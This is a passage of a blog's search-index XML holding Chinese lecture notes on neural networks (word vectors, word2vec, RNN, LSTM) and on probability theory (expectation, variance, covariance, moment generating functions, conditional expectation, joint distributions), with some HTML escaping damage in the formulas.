E_d(w)=\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script><p>  加入正则化项用于<strong>降低模型复杂性</strong>:</p><script type="math/tex; mode=display">  E_d(w)=\sum_{k=1}^{m}(t_{kd}-o_{kd})^2+\Vert w\Vert_2^2.</script><ul><li><p>2-范数: 很多参数值很小, 但基本不为 0, <strong>抗干扰能力强</strong>.</p></li><li><p>1-范数: 一些参数为 0, 起到<strong>特征选择</strong>的作用.</p></li></ul></li><li><p><strong>舍弃法</strong>: 随机地<strong>临时舍弃</strong>一些神经元.</p></li></ul></li><li><p><strong>增加数据量</strong>: 获得更多的数据.</p><ul><li><strong>数据增强法</strong>: 数据越多, 过拟合的风险就越小.</li></ul></li></ul><h2 id="词向量"><a href="#词向量" class="headerlink" title="词向量"></a>词向量</h2><ul><li><p>神经网络处理文本 (<strong>词&amp;文本</strong>) 的方法.</p></li><li><p><strong>独热编码 (one-hot)</strong>: 用与<strong>词表</strong>等长的<strong>向量</strong>表示一个词, 只有一个元素为 1.</p><ul><li>优点: 编码<strong>简单</strong>.</li><li>缺点: 编码太长, 无法度量词之间的<strong>相似性</strong> (例: <strong>2-范数度量</strong>).</li></ul></li><li><p><strong>分布式表示</strong>: 相比于独热编码, 是一种稠密表示.</p>  <div align="center"><img src="/pic/91.png" width="100%" height="100%"></div></li><li><p><strong>词嵌入</strong>: 把词向量从高维空间嵌入到低维空间中的一个方法.</p></li><li><p><strong>神经网络语言模型</strong>: 用神经网络实现的语言模型.</p>  <div align="center"><img src="/pic/92.png" width="100%" height="100%"></div><p>  标准的<strong>全连接网络</strong> (<strong>前向神经网络</strong>):</p>  <div align="center"><img src="/pic/93.png" width="100%" height="100%"></div><p>  语言模型同时训练<strong>词向量</strong>和<strong>权重</strong>:</p>  <div align="center"><img src="/pic/94.png" width="100%" height="100%"></div></li><li><p><strong>训练</strong>神经网络语言模型: 让<strong>联合概率最大化</strong>估计概率 (<strong>最大似然估计</strong>).</p><ul><li><p>联合概率分布一般含有参数.</p></li><li><p>通过<strong>最大似然方法</strong>估计联合概率的参数.</p></li><li><p>对于神经网络语言模型, 即是估计网络的参数值.</p></li><li><p><strong>损失函数</strong> (<strong>负对数似然函数</strong>):</p><script type="math/tex; mode=display">  -\sum_{w\in C}\log p(w=k\mid context(w),\theta).</script><p>  其中 $\theta$ 表示神经网络的所有参数, $C$ 为语料库.</p></li><li><p><strong>存在问题</strong>:</p><ul><li><strong>神经元个数</strong>等于<strong>词表长度</strong> $K$.</li><li>$m(n-1)$ 个输入, <strong>全连接参数多</strong>.</li></ul></li></ul></li><li><p><strong>训练</strong>词向量:</p>  <div align="center"><img src="/pic/95.png" width="100%" height="100%"></div><p>  每个词<strong>随机给定</strong>词向量, 并在进行训练<strong>实时更新</strong> (<strong>输入层</strong>相当于一个<strong>新增的隐含层</strong>). 通过训练语言模型, 得到词向量 (<strong>自监督</strong>).</p></li><li><p><strong>word2vec模型</strong>: 一种<strong>简化的神经网络语言模型</strong>.</p><ul><li><p><strong>连续词袋模型 (CBOW)</strong>: <strong>不考虑</strong>上下文中词的<strong>顺序</strong>.</p>  <div align="center"><img src="/pic/96.png" width="100%" height="100%"></div><p>  <strong>输出处理</strong>得到的 $x_w$ 的长度即为<strong>一个词向量的长度</strong>, 使用<strong>语料库预生成</strong>的 <strong>Huffman Tree</strong> 替换隐含层及输出层. <strong>每次训练</strong>时只计算<strong>与该词有关的参数</strong>, 且越是<strong>常用词</strong>涉及的<strong>参数越少</strong>, <strong>训练速度快</strong>.</p><p>  $W$ 经过霍夫曼树每个节点时的概率为:</p><script type="math/tex; mode=display">  p(d_i^w\mid x_w,\theta_{𝑖−1}^w)=      \begin{cases}      \sigma(x_w\cdot\theta_{𝑖−1}^w), & d_i^w=0\\      1-\sigma(x_w\cdot\theta_{𝑖−1}^w), & d_i^w=1      \end{cases}</script><p>  其<strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L=-\sum_{i=2}^{l_w}\{(1-d_i^w)\log{[\sigma(x_w\cdot\theta_{𝑖−1}^w)]}+d_i^w\log{[1-\sigma(x_w\cdot\theta_{𝑖−1}^w)]}\}.</script></li><li><strong>跳词模型 (Skip-Gram Model)</strong>.</li></ul></li><li><p><strong>TextCNN</strong>: 词向量应用——情感分类问题.</p>  <div align="center"><img src="/pic/97.png" width="100%" height="100%"></div></li></ul><h2 id="循环神经网络-RNN"><a href="#循环神经网络-RNN" class="headerlink" title="循环神经网络 (RNN)"></a>循环神经网络 (RNN)</h2><ul><li><p>网络辨析:</p><ul><li><p>数据角度:</p><ul><li>序列数据.</li><li>数据之间有先后联系.</li></ul></li><li><p>网络结构角度:</p><ul><li><strong>前馈网络</strong> (<strong>CNN</strong>).</li><li><strong>反馈网络</strong> (<strong>RNN</strong>).</li></ul></li><li><p>表示角度:</p><ul><li>句子向量、序列向量.</li></ul></li></ul></li><li><p><strong>循环模块</strong>:</p>  <div align="center"><img src="/pic/98.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/99.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/100.png" width="100%" height="100%"></div></li><li><p><strong>循环神经网络的训练</strong>: 与具体任务结合.</p>  <div align="center"><img src="/pic/101.png" width="100%" height="100%"></div></li><li><p><strong>例</strong>: <strong>看图说话</strong>问题</p>  <div align="center"><img src="/pic/102.png" width="100%" height="100%"></div></li><li><p><strong>双向循环神经网络</strong>: 防止<strong>序列前面的内容被后面的内容淹没</strong>.</p>  <div align="center"><img src="/pic/103.png" width="100%" height="100%"></div></li><li><p><strong>序列到序列循环神经网络</strong>: 机器翻译、问答系统.</p>  <div align="center"><img src="/pic/104.png" width="100%" height="100%"></div></li></ul><h2 id="长短期记忆网络-LSTM"><a href="#长短期记忆网络-LSTM" class="headerlink" title="长短期记忆网络 (LSTM)"></a>长短期记忆网络 (LSTM)</h2><ul><li><p>简单 <strong>RNN</strong> 存在的问题:</p><ul><li><strong>长期依赖问题</strong>.</li><li><strong>重点选择问题</strong>: 不同的任务词的重要性不同.</li></ul></li><li><p><strong>LSTM</strong> 模块:</p>  <div align="center"><img src="/pic/105.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/106.png" width="100%" height="100%"></div><p>  通过<strong>状态</strong>解决<strong>梯度消失问题</strong>; 通过<strong>“门”</strong>进行<strong>选择</strong>, 结构一样, 参数不同.</p><p>  同简单 <strong>RNN</strong> 一样, <strong>LSTM</strong> 模块也是<strong>共用</strong>的.</p></li><li><p><strong>LSTM</strong> 具体结构:</p>  <div align="center"><img src="/pic/107.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/108.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/109.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/110.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/111.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/112.png" width="100%" height="100%"></div></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记4</title>
      <link href="/2023/04/11/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-4/"/>
      <url>/2023/04/11/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-4-随机变量的数字特征"><a href="#Chap-4-随机变量的数字特征" class="headerlink" title="Chap 4 随机变量的数字特征"></a>Chap 4 随机变量的数字特征</h1><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ul><li><p><strong>定义(期望)</strong> </p><script type="math/tex; mode=display">  E(X)=  \begin{cases}  \sum\limits_{i}x_if(x_i)\\  \int\limits_{-\infty}^{\infty}xf(x)dx\\  \end{cases}</script></li><li><p><strong>注</strong></p><ul><li>存在 $\Leftrightarrow$ 绝对收敛;</li><li><strong>(Lebesque-Stieltjes 积分)</strong>  一般定义: $E(X)=\int\limits_{-\infty}^{\infty}xdF$;</li><li>集中趋势的一种刻画;</li><li>$E((X_1,\cdots,X_n)):=(E(X_1),\cdots,E(X_n))$.</li></ul></li><li><p><strong>性质</strong></p><ul><li><script type="math/tex; mode=display">E(g(X_1,\cdots,X_n))=\begin{cases}\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)\\\int\limits_{\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)dx_1\cdots dx_n\end{cases}</script></li><li><p><strong>(线性性质)</strong>  $E(aX+bY)=aE(X)+bE(Y)$;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立, 则 $E(X_1\cdots X_n)=E(X_1)\cdots E(X_n)$.</p></li></ul></li></ul><h2 id="分位数"><a href="#分位数" class="headerlink" title="分位数"></a>分位数</h2><ul><li><p><strong>定义(中位数)</strong>  $X$ 连续, 若 $P(X\le m)=\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</p></li><li><p><strong>注</strong></p><ul><li>$F(m)=\dfrac{1}{2}$;</li><li>$P(X<m)=\dfrac{1}{2}=p(x>m)$;</m)=\dfrac{1}{2}=p(x></li><li>中位数不一定唯一.</li></ul></li><li><p><strong>定义(中位数)</strong>  若 $P(X<m)\le\dfrac{1}{2}$ 且="" $p(x="">m)\le\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</m)\le\dfrac{1}{2}$></p></li><li><p><strong>定义(下侧 $\alpha-$分位数)</strong></p><p>  $\forall\alpha\in(0,1)$, 若 $P(X<a)\le\alpha$ 且="" $p(x="">a)\le 1-\alpha$, 称 $a$ 为 $X$ 的下侧 $\alpha-$分位数.</a)\le\alpha$></p></li><li><p><strong>注</strong></p><ul><li>若 $X$ 连续, 则 $P(X&lt;a)=\alpha$;</li><li>$F^{-1}(\alpha)=\inf\{x\mid F(x)\ge\alpha\}$ 为一个 $\alpha$ 分位数.</li></ul></li><li><p><strong>注</strong></p><ul><li>中位数也是集中趋势的一种刻画;</li><li>众数 (方便定义: $f(x)$ 的最大值点).</li></ul></li></ul><h2 id="方差"><a href="#方差" class="headerlink" title="方差"></a>方差</h2><ul><li><strong>定义(方差与标准差)</strong>  给出定义:<script type="math/tex; mode=display">Var(X):=E((X-E(X))^2)=E(X^2)-E^2(X);\\SD(X):=\sqrt{Var(X)}.</script></li></ul><ul><li><strong>注</strong>  刻画了数据的集中程度.</li><li><strong>性质</strong><ul><li>$Var(c)\equiv 0$;</li><li>$Var(X+c)\equiv Var(x)$;</li><li>$Var(cX)\equiv c^2Var(X)$;</li><li>$Var(X+Y)=Var(X)+Var(Y)+2E((X-E(X))(Y-E(Y)))$.</li></ul></li><li><strong>注</strong>  定义变异系数 $\dfrac{\sigma}{\mu}$.</li></ul><h2 id="协方差与相关系数"><a href="#协方差与相关系数" class="headerlink" title="协方差与相关系数"></a>协方差与相关系数</h2><ul><li><strong>定义(协方差)</strong> <script type="math/tex; mode=display">Cov(X,Y):=E((X-\mu_1)(Y-\mu_2)).</script></li></ul><ul><li><p><strong>注</strong></p><ul><li><p>$Cov(X,X)=Var(X)$;</p></li><li><p>$Cov(X,Y)=Cov(Y,X)$;</p></li><li><p>$Cov(X,Y)=E(XY)-\mu_1\mu_2=E(XY)-E(X)E(Y)$;</p></li><li><p>$Cov(aX_1+bX_2+c,Y)=aCov(X_1,Y)+bCov(X_2,Y)$.</p></li></ul></li><li><p><strong>定义(协方差矩阵)</strong>  对 $\overline{X}=(X_1,\cdots,X_n), \overline{Y}=(Y_1,\cdots,Y_n).$ 我们有协方差矩阵</p><script type="math/tex; mode=display">  \begin{aligned}  Cov(\overline{X},\overline{Y})&=(Cov(\overline{X}_i,\overline{Y}_j))_{n\times n}\\  &=E((\overline{X}-E(\overline{X}))^{T}(\overline{Y}-E(\overline{Y}))).  \end{aligned}</script></li><li><p><strong>注</strong>  方差矩阵: </p><script type="math/tex; mode=display">\begin{aligned}Var(\overline{X})&=Cov(\overline{X},\overline{Y})\\&=(Cov(\overline{X}_i,\overline{X}_j))_{n\times n}\\&=(\sigma_{ij})_{n\times n}.\end{aligned}</script></li><li><p><strong>定义(相关系数)</strong></p><script type="math/tex; mode=display">  Corr(X,Y)=\dfrac{Cov(X,Y)}{\sigma_1\sigma_2}=E(\dfrac{X-\mu_1}{\sigma_1}\cdot\dfrac{Y-\mu_2}{\sigma_2}).</script></li><li><p><strong>定理</strong></p><ul><li>若 $X,Y$ 独立, 则 $Corr(X,Y)=0$, 称为 $X,Y$ 不相关.</li><li>联合正态的特殊情况, 不相关可推出独立.</li><li>$\vert Corr(X,Y)\vert\le 1$, 等号成立当且仅当 $\exist\,a,b$ 使得 $P(Y=aX+b)=1$.</li></ul></li><li><p><strong>证明</strong>  给出引理 <strong>Schwartz 不等式</strong>: </p><script type="math/tex; mode=display">E^2(UV)\le E(U^2)E(V^2).</script><p>取等当且仅当 $\exist\,c\in\mathbb{R}$ 使得 $U=cV$. 取 $U=\dfrac{X-\mu_1}{\sigma_1},V=\dfrac{Y-\mu_2}{\sigma_2}$.</p></li><li><p><strong>注</strong></p><ul><li>$\rho:=Corr(X,Y)=\pm 1$, 则 $a=\pm\dfrac{\sigma_2}{\sigma_1}$;</li><li><p>$\rho:=Corr(X,Y)=0$ (不相关) $\not\Rightarrow$ 独立;</p><p>如 $X\sim N(0,1)$, $Y=X^2$ 不相关但是不独立.</p></li><li>相关系数为线性相关系数.</li></ul></li><li><p><strong>例</strong>  $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则</p><script type="math/tex; mode=display">\rho=Corr(X_1,X_2).</script></li></ul><h2 id="矩"><a href="#矩" class="headerlink" title="矩"></a>矩</h2><ul><li><p><strong>定义(矩)</strong>  称</p><script type="math/tex; mode=display">  E((X-c)^k)(k=1,2,\cdots)</script><p>  为 $X$ 关于 $c$ 点的 $k$ 阶矩. 特别地, $c=0$ 对应原点矩, $c=\mu$ 对应中心矩.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)=$ 1 阶原点矩, 0 $\equiv$ 1 阶中心矩;</li><li>$Var(X)=$ 2 阶中心矩;</li></ul></li><li><p><strong>定义(偏度系数)</strong></p><script type="math/tex; mode=display">  Skew(X)=\dfrac{E((X-\mu)^3)}{\sigma^3}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^3\right).</script><p>  称为 3 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>0 $\equiv$ 1 阶标准矩, 1 $\equiv$ 2 阶标准矩.</li><li>$Skew(X)&lt;0$ 表示负偏, $Skew(X)&gt;0$ 表示正偏, 刻画非对称程度;</li><li>相比于 5 阶及以上的奇数阶矩, 3 阶矩的计算相对简单, 噪声影响较小;</li><li>不是唯一的刻画偏度的特征数.</li></ul></li><li><p><strong>定义(峰度系数)</strong></p><script type="math/tex; mode=display">  Kurt(X)=\dfrac{E((X-\mu)^4)}{\sigma^4}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^4\right).</script><p>  称为 4 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>正态分布的峰度 $\equiv$ 3, 超额峰度 $:=Kurt(X)-3$;</li><li>$Kurt(X)&gt;3\leftrightarrow$ 尖峰厚尾;</li><li>没有一个数字特征能完美刻画尾部形.</li></ul></li></ul><h2 id="矩母函数"><a href="#矩母函数" class="headerlink" title="矩母函数"></a>矩母函数</h2><ul><li><p><strong>定义(矩母函数)</strong></p><p>若 $M_X(t)=E(e^{tX})$ 在 $t=0$ 的某个邻域内存在, 则称 $M_X(t)$ 为 $X$ 的矩母函数. 否则称 $X$ 的矩母函数 <strong>MGF</strong> 不存在.</p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=\int_{0}^{\infty}e^{tx}\lambda e^{-\lambda x}dx\\&=\dfrac{\lambda}{\lambda - t},\,t<\lambda.\end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=\dfrac{1}{\sqrt{2\pi}}\int_{0}^{\infty}e^{tx}e^{-\tfrac{1}{2}x^2}dx\\&=e^{\tfrac{t^2}{2}},\,t\in\mathbb{R}.\end{aligned}</script></li><li><p><strong>性质</strong></p><ul><li>$M_X(0)\equiv 1$;</li><li>$Y=aX+b$, 则 $M_Y(t)=E(e^{t(aX+b)})=e^{tb}M_X(at)$.</li></ul></li><li><p><strong>例</strong>  $Y\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_Y(t)&=e^{t\mu}M_X(\sigma t)\\&=e^{\tfrac{\sigma^2t^2}{2}+\mu t},\,t\in\mathbb{R}.\end{aligned}</script></li><li><p><strong>性质(矩母函数确定矩)</strong></p><script type="math/tex; mode=display">E(X^n)=M_X^{(n)}(0).</script></li><li><p><strong>证明</strong></p><script type="math/tex; mode=display">  \begin{aligned}  M_X^{(n)}(t)&=\sum_{n=0}^{\infty}\dfrac{M_X^{(n)}(0)}{n!}t^n.  \end{aligned}</script><p>  又因为</p><script type="math/tex; mode=display">  \begin{aligned}  M_X(t)&=E(e^{tX})\\  &=E\left(\sum_{n=0}^{\infty}\dfrac{X^n}{n!}t^n\right)\\  &=\sum_{n=0}^{\infty}\dfrac{E(X^n)}{n!}t^n.\\  \end{aligned}</script><p>  比较系数即得.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=e^{\tfrac{t^2}{2}},\,t\in\mathbb{R}\\&=\sum_{n=0}^{\infty}\dfrac{(\tfrac{t^2}{2})^n}{n!}\\&=\sum_{n=0}^{\infty}\dfrac{(2n)!}{2^nn!}\cdot\dfrac{t^{2n}}{(2n)!}\end{aligned}</script><p>可得</p><script type="math/tex; mode=display">\begin{cases}E(X^{2n+1})\equiv 0,\\E(X^{2n})=\dfrac{(2n)!}{2^nn!}.\end{cases}</script></li><li><p><strong>性质(矩母函数确定分布)</strong></p><p>若 $\exists$ $a&gt;0$, 使得 $M_X(t)=M_Y(t)$, $\forall\,t\in(-a,a)$, 则 $X$, $Y$ 同分布.</p></li><li><p><strong>例</strong>  $M_X(t)=\dfrac{1}{4}e^{-t}+\dfrac{1}{2}+\dfrac{1}{8}e^{4t}+\dfrac{1}{8}e^{5t}$.</p></li><li><p><strong>解答</strong>  $X$ 离散, 设 $P(X=k)=p_k$, 我们有</p><script type="math/tex; mode=display">M_X(t)=E(e^{tX})=\sum_ke^{tk}p_k.</script><p>可得分布</p><script type="math/tex; mode=display">P(X=-1)=\dfrac{1}{4};\\P(X=0)=\dfrac{1}{2};\\P(X=4)=\dfrac{1}{8};\\P(X=5)=\dfrac{1}{8}.</script></li><li><p><strong>例</strong>  $f_1(x)=\dfrac{1}{\sqrt{2\pi}x}e^{-\tfrac{(\ln x)^2}{2}}, x&gt;0$, $f_2(x)=f_1(x)+f_1(x)\sin(2\pi\ln x)$.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">\begin{aligned}E(X_2^n)&=E(X_1^n)+\int_{0}^{\infty}x^nf_1(x)\sin(2\pi\ln x)dx\\&=0\,(令 \,y=\ln x-n)\\\end{aligned}</script><p>这是一个同矩不同分布的例子.</p></li><li><p><strong>性质(独立随机变量和的分布)</strong></p><p>若 $X$, $Y$ 独立, 则 $M_{X+Y}(t)=M_X(t)M_Y(t)$.</p></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  M_{X+Y}(t)&=E(e^{t(X+Y)})\\  &=E(e^{tX}e^{tY})\\  &=E(e^{tX})E(e^{tY})\\  &=M_X(t)M_Y(t).  \end{aligned}</script></li><li><p><strong>例</strong>  $X_1,X_2,\cdots,X_n$ 独立正态, 则 $X_1+X_2+\cdots+X_n$ 正态.</p></li><li><p><strong>解答</strong>  考察 $X_i\sim N(\mu_i,\sigma_i^2)$, 其中 $i=1,2$. 那么</p><script type="math/tex; mode=display">M_{X+Y}(t)=M_X(t)M_Y(t)=e^{\tfrac{1}{2}(\sigma_1^2+\sigma_2^2)+(\mu_1+\mu_2)t}.</script><p>进而得到</p><script type="math/tex; mode=display">X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2).</script></li><li><p><strong>注</strong></p><ul><li>若 $N$ 为有限数;</li><li>若 $N$ 为随机变量, 与 $X_i$ 独立.</li></ul></li><li><p><strong>注</strong></p><ul><li><p>$(X_1,X_2,\cdots,X_n)$ 的 <strong>MGF</strong> 为:</p><script type="math/tex; mode=display">M_{(X_1,X_2,\cdots,X_n)}(t_1,t_2,\cdots,t_n)=E(e^{t_1X_1+t_2X_2+\cdots+t_nX_n}).</script></li><li><p>特征函数 </p><script type="math/tex; mode=display">E(e^{itX}), i^2=-1.</script></li></ul></li></ul><h2 id="条件期望"><a href="#条件期望" class="headerlink" title="条件期望"></a>条件期望</h2><ul><li><p><strong>定义(条件期望)</strong></p><script type="math/tex; mode=display">E(Y\mid X\in A)=\begin{cases}\sum\limits_iy_iP(Y=y_i\mid X\in A)\\\int\limits_{-\infty}^{\infty}yf(y\mid X\in A)dy\\\end{cases}</script><script type="math/tex; mode=display">E(Y\mid x)=\begin{cases}\sum\limits_iy_iP(Y=y_i\mid X=x)\\\int\limits_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\\\end{cases}</script><p>我们称 $E(Y\mid X)$ 为新的随机变量 $h(X)$, 是 $Y$ 对 $X$ 的回归函数.</p></li><li><p><strong>例</strong>  $(X,Y)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 $E(Y\mid X)=\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(X-\mu_1)$.</p></li><li><p><strong>例</strong>  甲乙两种同类产品, 评价使用寿命为 10 年, 15 年, 市场占有率为 60%, 40%. 随机购买一件产品, 求期望寿命?</p></li><li><p><strong>解答</strong>  为 $10\times 60\%+15\times 40\%=12$ 年.</p><p>若记 $X$ 为产品类型, $Y$ 为产品寿命, 则上式可写成</p><script type="math/tex; mode=display">\begin{aligned}E(Y)&=12\\&=10\times 60\%+15\times 40\%\\&=E(Y\mid X=1)P(X=1)+E(Y\mid X=2)P(X=2)\\&=E[E(Y\mid X)].\end{aligned}</script><p>不同取值分层平均并加权.</p></li><li><p><strong>定义(全期望公式)</strong></p><script type="math/tex; mode=display">  E(Y)=E[E(Y\mid X)].</script></li><li><p><strong>证明</strong>  以连续型为例:</p><script type="math/tex; mode=display">  \begin{aligned}  E(Y\mid x)&=\int_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\\  &=\int_{-\infty}^{\infty}y\dfrac{f(x,y)}{f_X(x)}dy  \end{aligned}</script><p>  从而有</p><script type="math/tex; mode=display">  \begin{aligned}  E[E(Y\mid X)]&=\int_{-\infty}^{\infty}E(Y\mid x)f_X(x)dx\\  &=\int_{-\infty}^{\infty}\int_{-\infty}^{\infty}yf(x,y)dydx\\  &=E(Y).  \end{aligned}</script></li><li><p><strong>注</strong>  一般地, $E[g(X,Y)]=E[E(g(X,Y)\mid X)]$.</p></li><li><p><strong>定理(均方最优预测)</strong></p><script type="math/tex; mode=display">E[(Y-g(X))^2]\ge E[(Y-h(X))^2]=E[(Y-E(Y\mid X))^2]</script><p>称为均方误差 <strong>MSE</strong> 下的最优预测.</p></li><li><p><strong>证明</strong></p><script type="math/tex; mode=display">  E[(Y-c)^2]\ge E[(Y-E(Y))^2].</script><p>  因此</p><script type="math/tex; mode=display">  E[(Y-g(X))^2\mid X]\ge E[(Y-E(Y\mid X))^2\mid X].</script><p>   两边对 $X$ 取均值, 可得</p><script type="math/tex; mode=display">  E[(Y-g(X))^2]\ge E[(Y-E(Y\mid X))^2].</script></li><li><p><strong>注</strong></p><ul><li><p>$E(Y\mid X)$ 依赖 $(X,Y)$ 的联合分布 (不易获取);</p></li><li><p>转而求最优线性预测:</p><script type="math/tex; mode=display">\min_{a,b}E[(Y-(aX+b))^2]\,(最小二乘法)</script></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记3</title>
      <link href="/2023/03/24/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-3/"/>
      <url>/2023/03/24/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-3-联合分布"><a href="#Chap-3-联合分布" class="headerlink" title="Chap 3 联合分布"></a>Chap 3 联合分布</h1><h2 id="随机向量"><a href="#随机向量" class="headerlink" title="随机向量"></a>随机向量</h2><ul><li><p><strong>定义(随机向量)</strong>  我们称</p><script type="math/tex; mode=display">(X_1,\cdots,X_n):\Omega\rightarrow\mathbb{R}^n</script><p>为随机向量, 当 $X_i(1\le i\le n)$ 均为随机变量.</p></li><li><p><strong>定义(联合 CDF)</strong></p><script type="math/tex; mode=display">  F(x_1,\cdots,x_n):=F(X_1\le x_1,\cdots,X_n\le x_n),\forall\,(x_1,\cdots,x_n)\in\mathbb{R}^n.</script></li><li><p><strong>注</strong>  若 $X_i:\Omega_i\rightarrow\mathbb{R}$, 需扩充 $\Omega=\Omega_1\times\cdots\Omega_n$.</p></li></ul><h2 id="离散分布"><a href="#离散分布" class="headerlink" title="离散分布"></a>离散分布</h2><ul><li><p><strong>定义(离散型随机向量)</strong> </p><script type="math/tex; mode=display">(X_1,X_2,\cdots,X_n)为离散型\Leftrightarrow X_i(1\le i\le n)为离散型.</script></li><li><p><strong>定义(概率质量函数)(PMF)</strong></p><script type="math/tex; mode=display">  \begin{aligned}  f(x_1,x_2,\cdots,x_n):&=P((X_1,X_2,\cdots,X_n)=(x_1,x_2,\cdots,x_n))\\  &= P(X_1= x_1,X_2=x_2,\cdots,X_n=x_n).  \end{aligned}</script></li></ul><ul><li><p><strong>注</strong>  $\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}}f(x_1,\cdots,x_n)\equiv 1$.</p></li><li><p><strong>定义(多项分布)</strong>  若 $B_1, B_2\cdots,B_n$ 为互斥事件, 且 $\sum\limits_{i=1}^{n}B_i=\Omega$. 其发生的概率为 $p_1,\cdots,p_n$, 且 $\sum\limits_{i=1}^{n}p_i\equiv 1$. 满足</p><script type="math/tex; mode=display">P(X_1=k_1,\cdots,X_n=k_n)=\dfrac{N!}{k_1!\cdots k_n!}p_1^{k_1}\cdots p_n^{k_n},\,k_i\ge 0,\,\sum_{i=1}^{n}k_i=N.</script><p>其中 $\dfrac{N!}{k_1!\cdots k_n!}$ 为多项式系数.</p></li></ul><h2 id="连续分布"><a href="#连续分布" class="headerlink" title="连续分布"></a>连续分布</h2><ul><li><p><strong>定义(联合 PDF)</strong>  若存在 $f(x_1,\cdots,x_n)\ge 0$, 使得 $\forall\,Q\subset\mathbb{R}^n$ 可测, 都有</p><script type="math/tex; mode=display">P((X_1,\cdots,X_n)\in Q)=\int_Qf(x_1,\cdots,x_n)dx_1\cdots dx_n</script><p>则称 $(X_1,\cdots,X_n)$ 为连续型, $f$ 为 $(X_1,\cdots,X_n)$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$\int_{\mathbb{R}}f\equiv 1$;</li><li>以 $n=2$ 为例, $F(a,b)=\int_{-\infty}^{a}(\int_{-\infty}^{b}f(s,t)dt)ds$;</li><li>$f(a,b)=\dfrac{\partial^2 F}{\partial y\partial x}(a,b),\,a.e$.</li></ul></li><li><p><strong>定义(连续分布)(矩形域)</strong></p><script type="math/tex; mode=display">  f(x,y)=  \begin{cases}  \dfrac{1}{(b-a)(d-c)}, &(x,y)\in(a,b)\times(c,d) \\  0, &otherwise \\  \end{cases}</script></li><li><p><strong>定义(二元正态分布)</strong></p><script type="math/tex; mode=display">  f(x,y)=\dfrac{1}{2\pi\sigma_1\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}e^{-\frac{1}{2(1-\rho^2)}[(\frac{x-\mu_1}{\sigma_1})^2+(\frac{y-\mu_2}{\sigma_2})^2-2\rho\frac{x-\mu_1}{\sigma_1}\frac{y-\mu_2}{\sigma_2}]},\\</script><p>  其中 $(x,y)\in\mathbb{R}^2, \vert\rho\vert&lt;1$. </p><p>  上式中 $\exp$ 的指数可视为 $-\dfrac{1}{2}\overline{X}^TW\overline{X}=-\dfrac{1}{2}\overline{AX}^T\overline{AX}$, 其 <strong>Cholesky</strong> 分解为</p><script type="math/tex; mode=display">  \overline{X}=\left(  \begin{matrix}  \dfrac{x-\mu_1}{\sigma_1}\\  \dfrac{y-\mu_2}{\sigma_2}  \end{matrix}\right),  W=\dfrac{1}{1-\rho^2}\left(  \begin{matrix}  1 &-\rho\\  -\rho &1  \end{matrix}\right)\\  \Rightarrow  A=\dfrac{1}{\sqrt{1-\rho^2}}\left(  \begin{matrix}  \pm 1 &\mp\rho\\  0 &\pm\sqrt{1-\rho^2}  \end{matrix}\right).</script></li><li><p><strong>注</strong></p><ul><li>$f(x,y)$ 的等值线图像为椭圆;</li><li>$\rho$ 的意义?</li></ul></li></ul><h2 id="边际分布"><a href="#边际分布" class="headerlink" title="边际分布"></a>边际分布</h2><ul><li><p><strong>定义(边际 CDF)</strong></p><script type="math/tex; mode=display">  F_i(x) 